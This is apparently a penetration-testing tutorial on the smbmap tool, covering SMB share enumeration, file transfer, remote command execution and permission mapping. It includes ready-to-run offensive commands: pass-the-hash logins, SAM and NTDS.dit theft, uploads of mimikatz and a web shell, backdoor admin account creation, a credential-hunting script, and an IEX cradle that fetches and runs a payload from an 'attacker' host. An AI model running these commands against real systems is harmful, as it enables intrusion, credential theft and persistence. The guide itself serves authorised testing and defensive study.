# smbmap - Practical Techniques

## Overview

This document covers practical techniques for using smbmap to enumerate and interact with SMB shares. smbmap excels at permission mapping, file operations, and command execution on Windows systems.

## Table of Contents

- [Share Access Enumeration](#share-access-enumeration)
- [File Searching](#file-searching)
- [File Download and Upload](#file-download-and-upload)
- [Command Execution](#command-execution)
- [Permission Mapping](#permission-mapping)
- [Advanced Techniques](#advanced-techniques)
- [Comparison with enum4linux](#comparison-with-enum4linux)

---

## Share Access Enumeration

### Basic Share Discovery

```bash
# Null session (anonymous)
smbmap -H 10.10.10.1

# With credentials
smbmap -H 10.10.10.1 -u 'username' -p 'password'

# Domain authentication
smbmap -H 10.10.10.1 -u 'username' -p 'password' -d 'DOMAIN'
```

**Expected Output:**
```
[+] IP: 10.10.10.1:445   Name: dc01.domain.local   Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
        Backups                                                 READ, WRITE     Company Backups
        IT                                                      READ ONLY       IT Department
```

### Multi-Host Enumeration

```bash
# Scan multiple hosts from file
smbmap --host-file targets.txt -u 'username' -p 'password'

# Check SMB signing across network (relay attack planning)
smbmap --host-file targets.txt --signing

# Get OS versions
smbmap --host-file targets.txt -v

# Quiet mode - only show accessible shares
smbmap --host-file targets.txt -u 'user' -p 'pass' -q
```

### Pass-the-Hash Authentication

```bash
# Using NTLM hash (LM:NT format)
smbmap -H 10.10.10.1 -u 'Administrator' -p 'aad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d'

# Using just NT hash (empty LM)
smbmap -H 10.10.10.1 -u 'Administrator' -p ':da76f2c4c96028b7a6111aef4a50a94d'
```

### Kerberos Authentication

```bash
# Using cached credentials (TGT)
export KRB5CCNAME='/tmp/krb5cc_user'
smbmap -H dc01.domain.local -k --no-pass

# With specific DC
smbmap -H dc01.domain.local -k --no-pass --dc-ip 10.10.10.1
```

---

## File Searching

### Directory Listing

```bash
# List root of a share
smbmap -H 10.10.10.1 -u 'user' -p 'pass' -r 'Backups'

# Recursive listing with depth
smbmap -H 10.10.10.1 -u 'user' -p 'pass' -r 'Backups' --depth 3

# List C$ drive (requires admin)
smbmap -H 10.10.10.1 -u 'admin' -p 'pass' -r 'C$'

# List specific subdirectory
smbmap -H 10.10.10.1 -u 'user' -p 'pass' -r 'C$\Users\Administrator\Desktop'

# Directory listing only (no files)
smbmap -H 10.10.10.1 -u 'user' -p 'pass' -r 'Backups' --dir-only
```

**Expected Output:**
```
[+] IP: 10.10.10.1:445   Name: server.domain.local
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Backups                                                 READ, WRITE
        .\Backups\*
        dr--r--r--                0 Sat Dec 14 10:23:15 2024    .
        dr--r--r--                0 Sat Dec 14 10:23:15 2024    ..
        dr--r--r--                0 Mon Dec 09 14:30:22 2024    2024-Q4
        fr--r--r--            15234 Fri Dec 13 09:15:44 2024    backup_script.ps1
        fr--r--r--          2048576 Thu Dec 12 16:45:33 2024    database.bak
        fr--r--r--              892 Wed Dec 11 11:20:18 2024    credentials.txt
```

### Auto-Download Matching Files

```bash
# Download files matching regex pattern
smbmap -H 10.10.10.1 -u 'user' -p 'pass' -r 'Backups' --depth 5 -A 'password'

# Case-insensitive pattern matching
smbmap -H 10.10.10.1 -u 'user' -p 'pass' -r 'C$\Users' --depth 3 -A '(?i)(password|credential|secret)'

# Common patterns for sensitive files
smbmap -H 10.10.10.1 -u 'user' -p 'pass' -r 'Backups' --depth 5 -A '\.(kdbx|key|pem|pfx|p12)$'

# Configuration files
smbmap -H 10.10.10.1 -u 'user' -p 'pass' -r 'C$' --depth 4 -A '(web\.config|appsettings\.json|\.env)'
```

Downloaded files are saved locally with path structure preserved.

### Content Search (PowerShell Required)

```bash
# Search for password strings in files (requires admin + PowerShell)
smbmap -H 10.10.10.1 -u 'admin' -p 'pass' -F '[Pp]assword'

# Search specific path
smbmap -H 10.10.10.1 -u 'admin' -p 'pass' -F 'password' --search-path 'C:\Users'

# Search for SSN pattern
smbmap -H 10.10.10.1 -u 'admin' -p 'pass' -F '[0-9]{3}-[0-9]{2}-[0-9]{4}'

# Custom search timeout
smbmap -H 10.10.10.1 -u 'admin' -p 'pass' -F 'secret' --search-timeout 600
```

---

## File Download and Upload

### Downloading Files

```bash
# Download single file
smbmap -H 10.10.10.1 -u 'user' -p 'pass' --download 'Backups\credentials.txt'

# Download from C$ (admin required)
smbmap -H 10.10.10.1 -u 'admin' -p 'pass' --download 'C$\Windows\repair\SAM'

# Download NTDS.dit (domain controller, after VSS snapshot)
smbmap -H 10.10.10.1 -u 'admin' -p 'pass' --download 'C$\temp\ntds.dit'
```

### Uploading Files

```bash
# Upload file to share
smbmap -H 10.10.10.1 -u 'user' -p 'pass' --upload /tmp/shell.exe 'Backups\shell.exe'

# Upload to C$ (admin required)
smbmap -H 10.10.10.1 -u 'admin' -p 'pass' --upload /tmp/mimikatz.exe 'C$\temp\mimi.exe'

# Upload web shell to IIS
smbmap -H 10.10.10.1 -u 'admin' -p 'pass' --upload /tmp/shell.aspx 'C$\inetpub\wwwroot\shell.aspx'
```

### Deleting Files

```bash
# Delete remote file
smbmap -H 10.10.10.1 -u 'user' -p 'pass' --delete 'Backups\shell.exe'

# Skip confirmation prompt
smbmap -H 10.10.10.1 -u 'user' -p 'pass' --delete 'C$\temp\mimikatz.exe' --skip
```

---

## Command Execution

### Remote Command Execution

```bash
# Execute command via WMI (default, stealthier)
smbmap -H 10.10.10.1 -u 'admin' -p 'pass' -x 'whoami'

# Execute via PSExec (creates service, noisier)
smbmap -H 10.10.10.1 -u 'admin' -p 'pass' -x 'whoami' --mode psexec

# Execute PowerShell command
smbmap -H 10.10.10.1 -u 'admin' -p 'pass' -x 'powershell -c "Get-Process"'

# Get system information
smbmap -H 10.10.10.1 -u 'admin' -p 'pass' -x 'systeminfo'

# List domain groups
smbmap -H 10.10.10.1 -u 'admin' -p 'pass' -x 'net group "Domain Admins" /domain'

# Check network connections
smbmap -H 10.10.10.1 -u 'admin' -p 'pass' -x 'netstat -an'
```

**Expected Output:**
```
[+] IP: 10.10.10.1:445   Name: server.domain.local   Status: Authenticated
[+] Host: 10.10.10.1      Execution Output:
domain\administrator
```

### Execution Methods Comparison

| Method | Flag | Pros | Cons |
|--------|------|------|------|
| WMI | `--mode wmi` (default) | Stealthier, no service | May fail on some systems |
| PSExec | `--mode psexec` | Reliable, well-tested | Creates service, detected by AV |

### Common Command Execution Scenarios

```bash
# Check if you're admin
smbmap -H 10.10.10.1 -u 'user' -p 'pass' -x 'net localgroup Administrators'

# Check logged-in users
smbmap -H 10.10.10.1 -u 'admin' -p 'pass' -x 'query user'

# Create local admin account
smbmap -H 10.10.10.1 -u 'admin' -p 'pass' -x 'net user hacker P@ssw0rd /add && net localgroup Administrators hacker /add'

# Download and execute payload
smbmap -H 10.10.10.1 -u 'admin' -p 'pass' -x 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://attacker/shell.ps1\")"'
```

---

## Permission Mapping

### Understanding Share Permissions

```bash
# Enumerate all share permissions
smbmap -H 10.10.10.1 -u 'user' -p 'pass'

# List all drives (requires admin)
smbmap -H 10.10.10.1 -u 'admin' -p 'pass' -L

# Check admin status
smbmap -H 10.10.10.1 -u 'user' -p 'pass' --admin
```

### Permission Levels

| Permission | Meaning | Implications |
|------------|---------|--------------|
| NO ACCESS | Cannot access share | No enumeration possible |
| READ ONLY | Can read files/folders | Enumerate, download files |
| READ, WRITE | Full access | Upload, modify, delete files |

### Finding Writable Shares

```bash
# Quiet mode shows only accessible shares
smbmap -H 10.10.10.1 -u 'user' -p 'pass' -q

# Scan network for writable shares
smbmap --host-file targets.txt -u 'user' -p 'pass' -q | grep "READ, WRITE"

# Check specific share
smbmap -H 10.10.10.1 -u 'user' -p 'pass' -s 'IT'
```

### Verifying Write Access

```bash
# Attempt to write test file (if no --no-write-check)
smbmap -H 10.10.10.1 -u 'user' -p 'pass'

# Skip write check (faster but less accurate)
smbmap -H 10.10.10.1 -u 'user' -p 'pass' --no-write-check
```

---

## Advanced Techniques

### SMB Signing Assessment

For relay attack planning:

```bash
# Check single host
smbmap -H 10.10.10.1 --signing

# Check multiple hosts
smbmap --host-file targets.txt --signing

# Output CSV for analysis
smbmap --host-file targets.txt --signing --csv signing_results.csv
```

**Output Interpretation:**
- `signing:False` = SMB signing not required, vulnerable to relay
- `signing:True` = SMB signing required, relay attacks blocked

### Export Results

```bash
# Grep-friendly output
smbmap -H 10.10.10.1 -u 'user' -p 'pass' -r 'Backups' --depth 3 -g output.txt

# CSV export
smbmap -H 10.10.10.1 -u 'user' -p 'pass' -r 'Backups' --depth 3 --csv output.csv
```

### Hunting for Sensitive Files

```bash
#!/bin/bash
# Comprehensive file hunting script
TARGET=$1
USER=$2
PASS=$3

# High-value file patterns
PATTERNS=(
    'password'
    'credential'
    'secret'
    'config'
    '\.kdbx$'
    '\.key$'
    '\.pem$'
    '\.pfx$'
    'unattend\.xml'
    'web\.config'
    'id_rsa'
)

for share in $(smbmap -H $TARGET -u "$USER" -p "$PASS" -q --no-banner | grep -E "READ|WRITE" | awk '{print $1}'); do
    echo "[*] Searching share: $share"
    for pattern in "${PATTERNS[@]}"; do
        smbmap -H $TARGET -u "$USER" -p "$PASS" -r "$share" --depth 5 -A "$pattern" --no-banner 2>/dev/null
    done
done
```

### Pivoting Through Shares

```bash
# Map accessible shares across subnet
for ip in $(seq 1 254); do
    smbmap -H 192.168.1.$ip -u 'user' -p 'pass' -q --no-banner --timeout 2 2>/dev/null
done

# Or use host file
smbmap --host-file /tmp/subnet.txt -u 'user' -p 'pass' -q --timeout 2
```

---

## Comparison with enum4linux

### When to Use smbmap

| Scenario | Recommended Tool |
|----------|------------------|
| Share permission mapping | smbmap |
| File download/upload | smbmap |
| Recursive directory listing | smbmap |
| Command execution | smbmap |
| Multi-host scanning | smbmap |
| Pass-the-hash attacks | smbmap |
| SMB signing assessment | smbmap |
| File content search | smbmap |

### When to Use enum4linux

| Scenario | Recommended Tool |
|----------|------------------|
| User enumeration | enum4linux |
| Group enumeration | enum4linux |
| Password policy retrieval | enum4linux |
| RID cycling | enum4linux |
| NetBIOS/NBNS information | enum4linux |
| Domain SID discovery | enum4linux |

### Complementary Workflow

```bash
# Phase 1: Initial recon with enum4linux
enum4linux -a 10.10.10.1

# Phase 2: Detailed share enumeration with smbmap
smbmap -H 10.10.10.1 -u 'discovered_user' -p 'password'

# Phase 3: Explore accessible shares
smbmap -H 10.10.10.1 -u 'user' -p 'pass' -r 'Backups' --depth 5

# Phase 4: Download interesting files
smbmap -H 10.10.10.1 -u 'user' -p 'pass' --download 'Backups\credentials.txt'

# Phase 5: If admin access, execute commands
smbmap -H 10.10.10.1 -u 'admin' -p 'pass' -x 'whoami /priv'
```

### Feature Comparison Table

| Feature | smbmap | enum4linux |
|---------|--------|------------|
| Share enumeration | Detailed permissions | Basic listing |
| User enumeration | No | Yes |
| Group enumeration | No | Yes |
| Password policy | No | Yes |
| RID cycling | No | Yes |
| File download | Yes | No |
| File upload | Yes | No |
| File deletion | Yes | No |
| Command execution | Yes (WMI/PSExec) | No |
| Multi-host scanning | Yes | No |
| Pass-the-hash | Full support | Limited |
| Kerberos auth | Yes | No |
| Content search | Yes (PowerShell) | No |
| SMB signing check | Yes | No |
| Output formats | Grep, CSV | Text |

---

## Troubleshooting

### Common Errors

| Error | Cause | Solution |
|-------|-------|----------|
| `STATUS_ACCESS_DENIED` | Insufficient permissions | Check credentials |
| `STATUS_LOGON_FAILURE` | Wrong credentials | Verify user/pass |
| `Connection refused` | SMB not running | Check port 445 |
| `STATUS_NOT_SUPPORTED` | Feature not available | Try different auth |
| Timeout | Network issues | Increase `--timeout` |

### Improving Results

```bash
# Increase timeout for slow networks
smbmap -H 10.10.10.1 -u 'user' -p 'pass' --timeout 10

# Try different port
smbmap -H 10.10.10.1 -u 'user' -p 'pass' -P 139

# Remove banner for cleaner output
smbmap -H 10.10.10.1 -u 'user' -p 'pass' --no-banner

# Remove color for logging
smbmap -H 10.10.10.1 -u 'user' -p 'pass' --no-color
```

### Authentication Issues

```bash
# Try null session
smbmap -H 10.10.10.1

# Try guest account
smbmap -H 10.10.10.1 -u 'guest' -p ''

# Prompt for password (avoid command history)
smbmap -H 10.10.10.1 -u 'admin' --prompt
```
